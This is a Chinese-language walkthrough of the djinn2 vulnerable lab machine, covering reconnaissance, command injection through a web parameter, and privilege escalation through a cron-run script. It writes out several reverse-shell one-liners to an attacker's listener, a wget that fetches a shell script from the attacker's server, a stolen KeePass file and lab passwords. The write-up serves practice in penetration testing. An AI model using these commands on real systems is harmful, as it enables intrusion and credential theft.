# djinn2

## 复现过程

### 信息搜集

1. 扫描网段下主机ip`arp-scan -l`，靶机ip为192.168.1.89,kali ip为192.168.1.71；

![image-20251205153931041](assets/image-20251205153931041.png)

2. 扫描靶机开放端口`nmap -sV -p- 192.168.1.89`；

![image-20251205154239525](assets/image-20251205154239525.png)

3. 匿名连接ftp21端口`ftp anonymous@192.168.1.89`,密码为空，连接后`ls`查看；

![image-20251205184241275](assets/image-20251205184241275.png)

4. 将creds文件下载到本地`get creds.txt`；

![image-20251205184346256](assets/image-20251205184346256.png)

5. 查看文件内容`cat creds.txt`,发现一组账号密码；

![image-20251205184438106](assets/image-20251205184438106.png)

6. 扫描7331端口目录`dirsearch -u http://192.168.1.89:7331/`；

![image-20251205154913385](assets/image-20251205154913385.png)

7. 访问source目录，下载了一个文件；

![image-20251205154945560](assets/image-20251205154945560.png)

8. 打开后发现这段信息，提示需要在5000端口构造正确的参数；

![image-20251205155051533](assets/image-20251205155051533.png)

9. 浏览器访问5000端口，并开启burp代理；

![image-20251205155511063](assets/image-20251205155511063.png)

10. 打开burpsuite，开启拦截；

![image-20251205155310437](assets/image-20251205155310437.png)

11. 浏览器刷新页面，返回数据包；

![image-20251205155611356](assets/image-20251205155611356.png)

12. 右键数据包发送到重发模块；

![image-20251205155657233](assets/image-20251205155657233.png)

13. 修改请求方法为POST，并在url中构造参数username和password;

```
POST /?username=REDACTED&password=REDACTED HTTP/1.1
Host: 192.168.1.89:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

![image-20251205155922101](assets/image-20251205155922101.png)

14. 发送数据包后响应包中显示可以正常访问；

![image-20251205160113371](assets/image-20251205160113371.png)

15. 将username的值换成id；

![image-20251205160150896](assets/image-20251205160150896.png)

16. 发送后回显命令执行结果，判断存在命令执行漏洞；

![image-20251205160239275](assets/image-20251205160239275.png)

17. 执行`ls`查看当前目录下文件；

![image-20251205161040553](assets/image-20251205161040553.png)

18. 发送后返回app.py脚本；

![image-20251205161110841](assets/image-20251205161110841.png)

19. 查看脚本内容，`cat+app.py`；

![image-20251205161213889](assets/image-20251205161213889.png)

20. 发送后返回脚本内容，发现过滤关键字的黑名单；

![image-20251205161301651](assets/image-20251205161301651.png)

### 反弹shell

1. 在本地创建反弹shell文件`touch a.sh`，编辑`vi a.sh`,进入编辑器按 `i` 进入编辑模式，写入语句；

   ```
   #!/bin/bash
   bash -i >& /dev/tcp/ip/4444 0>&1
   ```

![image-20251205171700904](assets/image-20251205171700904.png)

2. 按ESC退出编辑模式，输入:wq回车保存文件并退出；

![image-20251205172346085](assets/image-20251205172346085.png)

3. kali开启http服务`python3 -m http.server 8083`；

![image-20251205172206491](assets/image-20251205172206491.png)

4. 构造执行命令将脚本下载到靶机/tmp目录下，发送；

   ```
   wget+-P+/tmp+http://ip:8083/a.sh
   ```

![image-20251205172948472](assets/image-20251205172948472.png)

5. 返回响应包；

![image-20251205173117516](assets/image-20251205173117516.png)

6. 对脚本进行赋权`chmod+777+/tmp/a.sh`,发送执行；

![image-20251205173206742](assets/image-20251205173206742.png)

7. 查看一下脚本是否成功上传`cat+/tmp/a.sh`,发送执行；

![image-20251205173406887](assets/image-20251205173406887.png)

8. 响应包中回显我们构造的命令；

![image-20251205173445962](assets/image-20251205173445962.png)

9. kali开启监听`nc -lvp 4444`；

![image-20251205173715468](assets/image-20251205173715468.png)

10. 执行脚本`/tmp/a.sh`,发送执行；

![image-20251205173759963](assets/image-20251205173759963.png)

11. 成功反弹shell；

![image-20251205173845888](assets/image-20251205173845888.png)

### 提权过程

1. 切换到/var/backups目录下`cd /var/backups`，`ls`查看文件，发现有一个kdbx文件；

![image-20251205182138479](assets/image-20251205182138479.png)

2. 在当前目录下开启http服务`python3 -m http.server 8084`；

![image-20251205183248528](assets/image-20251205183248528.png)

3. 在kali终端中将kdbx文件下载到本地；

   ```
   wget http://192.168.1.89:8084/nitu.kdbx
   ```

![image-20251205183432410](assets/image-20251205183432410.png)

4. 下载keepass2工具 `apt install keepass2`；

![image-20251205183542081](assets/image-20251205183542081.png)

5. 下载完后输入`keepass2 -h` 来打开工具；

![image-20251205183643311](assets/image-20251205183643311.png)

6. 进入工具后点击file；

![image-20251205183714278](assets/image-20251205183714278.png)

7. 打开文件；

![image-20251205183734839](assets/image-20251205183734839.png)

8. 双击打开下载的kdbx文件；

![image-20251205183809015](assets/image-20251205183809015.png)

9. 输入在creds.txt文件中得到的密码**7846A$56**；

![image-20251205185112611](assets/image-20251205185112611.png)

10. 打开后点击general，右键复制密码，得到密码**&HtMGd$LJB**；

![image-20251205185212267](assets/image-20251205185212267.png)

11. 用nitish用户连接ssh`ssh nitish@192.168.1.89`；

![image-20251205190130794](assets/image-20251205190130794.png)

12. 查看本地进程`netstat -ano`，发现本地监听2843端口；

![image-20251205190243335](assets/image-20251205190243335.png)

13. nc连接一下`nc 127.0.0.1 2843`，输入账号密码，选择5；

![image-20251205191040872](assets/image-20251205191040872.png)

14. 将note命名为反弹shell命令，成功添加后，kali开启监听`nc -lvp 6666`，回到ssh里选择6去执行这个命令；

    ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 6666 >/tmp/f
    ```

![image-20251205191453262](assets/image-20251205191453262.png)

15. 成功反弹后再次开启虚拟终端；

    ```
    python3 -c "import pty;pty.spawn('/bin/bash')"
    ```

    

![image-20251205191937178](assets/image-20251205191937178.png)

16. 切换到var/mail目录下`cd /var/mail`，查看`ls`，查看内容`cat ugtan`，邮件里说有定时任务执行clean.sh脚本；

![image-20251205192254003](assets/image-20251205192254003.png)

17. 进入到家目录下`cd /home`，再进入到`cd ugtan/best/admin/ever`目录下，将反弹shell语句写入clean.sh里,依旧在本地开启监听，写入后查看`cat clean.sh`是否写入，等待一会;

    ```
    echo "bash -i >& /dev/tcp/ip/8888 0>&1" >clean.sh
    ```

![image-20251205193022035](assets/image-20251205193022035.png)

18. 成功反弹shell，并且提权；

![image-20251205193101689](assets/image-20251205193101689.png)

19. `ls`查看发现脚本，执行`./proof.sh`，得到flag；

![image-20251205193227109](assets/image-20251205193227109.png)